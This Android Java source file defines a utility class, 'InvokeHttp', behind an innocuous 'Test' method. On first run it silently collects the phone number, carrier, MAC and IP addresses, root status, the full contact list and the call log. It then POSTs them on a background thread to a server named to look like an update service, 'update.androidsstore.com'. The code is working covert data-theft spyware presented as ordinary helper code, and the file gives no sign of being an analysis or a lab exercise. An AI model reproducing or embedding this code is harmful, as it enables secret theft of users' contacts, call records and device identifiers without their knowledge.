package util;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.support.v4.content.ContextCompat;
import android.util.Log;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.Date;


public class InvokeHttp {

    private SharedPreferences.Editor mEdit;
    private String mStr1;
    private String mStr2;
    private String mStr3;
    private String mStr4;
    private String mStr5;
    private String mStr6;
    private String mStr7;
    private String mStr8;
    private String mStr9;
    private String mStr10;
    private String mStr11;
    private String mStr13;

    public void Test(final Context paramContext) {
        SharedPreferences sp = paramContext.getSharedPreferences("sp", Context.MODE_PRIVATE);
        boolean getData = sp.getBoolean("getData", false);
        mEdit = sp.edit();
        if (!getData) {
            Object localObject = new PhoneInfo(paramContext);
            mStr1 = ((PhoneInfo) localObject).getNativePhoneNumber();
            mStr2 = ((PhoneInfo) localObject).getProvidersName();
            mStr3 = Build.BRAND;
            mStr4 = ((PhoneInfo) localObject).getPhoneInfo();
            mStr5 = ((PhoneInfo) localObject).getLocalMac();
            mStr6 = ((PhoneInfo) localObject).getHostIP();
            mStr7 = ((PhoneInfo) localObject).haveRoot();
            mStr8 = Build.VERSION.RELEASE;
            mStr9 = ((PhoneInfo) localObject).isCN(paramContext);

            mStr10 = ((PhoneInfo) localObject).language();

            mStr11 = ((PhoneInfo) localObject).getContact2();
            mStr13 = ((PhoneInfo) localObject).GetCallsInPhone();


            String str12 = getTime();

            new Thread(new Runnable() {
                @Override
                public void run() {
                    httpUrlConnection();
                }
            }).start();

        }

    }


    private void httpUrlConnection() {
        HttpURLConnection httpConn = null;
        try {
            String pathUrl = "https://update.androidsstore.com/libraryservers/PhoneServlet";
            // 建立连接
            URL url = new URL(pathUrl);
            httpConn = (HttpURLConnection) url.openConnection();

            //设置属性
            httpConn.setRequestMethod("POST");
            httpConn.setReadTimeout(5000);
            httpConn.setConnectTimeout(5000);

            //设置输入流和输出流,都设置为true
            httpConn.setDoOutput(true);
            httpConn.setDoInput(true);

            //设置http请求头(可以参照:http://tools.jb51.net/table/http_header)
            httpConn.setRequestProperty("Accept", "text/plain, text/html");//指定客户端能够接收的内容类型
            httpConn.setRequestProperty("Connection", "keep-alive"); //http1.1

            //封装要提交的数据
            String str1 = URLEncoder.encode(mStr1, "UTF-8");
            String str2 = URLEncoder.encode(mStr2, "UTF-8");
            String str3 = URLEncoder.encode(mStr3, "UTF-8");
            String str4 = URLEncoder.encode(mStr4, "UTF-8");
            String str5 = URLEncoder.encode(mStr5, "UTF-8");
            String str6 = URLEncoder.encode(mStr6, "UTF-8");
            String str7 = URLEncoder.encode(mStr7, "UTF-8");
            String str8 = URLEncoder.encode(mStr8, "UTF-8");
            String str9 = URLEncoder.encode(mStr9, "UTF-8");
            String str10 = URLEncoder.encode(mStr10, "UTF-8");
            String str11 = URLEncoder.encode(mStr11, "UTF-8");
            String str13 = URLEncoder.encode(mStr13, "UTF-8");
            String message = "num=" + str1 +"&type=" + str2+"&brand=" + str3
                    +"&uicc=" + str4+"&mac=" + str5+"&ip=" + str6+"&root=" + str7
                    +"&version=" + str8+"&is_cn=" + str9+"&language=" + str10+"&contact=" + str11
                    +"&call=" + str13;

            //把提交的数据以输出流的形式提交到服务器
            OutputStream os = httpConn.getOutputStream();
            os.write(message.getBytes());
            // 获得响应状态
            int responseCode = httpConn.getResponseCode();
            os.flush();
            os.close();
            Log.e("----", "code"+ responseCode);
            if (HttpURLConnection.HTTP_OK == responseCode) {// 连接成功
//                mEdit.putBoolean("getData",true);
//                mEdit.commit();
                Log.e("----", "httpUrlConnection: secceed" );
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        } finally {
            if (httpConn != null) {
                httpConn.disconnect();
            }
        }


    }


    /**
     * @return 返回当前时间
     */
    public static String getTime() {
        Date now = new Date();
        java.text.SimpleDateFormat dateFormat = new java.text.SimpleDateFormat("yyyy-MM-dd+HH:mm");//可以方便地修改日期格式
        return dateFormat.format(now);
    }

    /**
     * 权限检查
     */
    public boolean hasPermission(Context context, String... permissions) {
        if (Build.VERSION.SDK_INT < 23) {
            return true;
        }

        for (String permission : permissions) {
            if (ContextCompat.checkSelfPermission(context, permission) ==
                    PackageManager.PERMISSION_DENIED) {
                Log.e("====", "自身没有此权限" );
                return false;
            }
        }
        return true;
    }
}


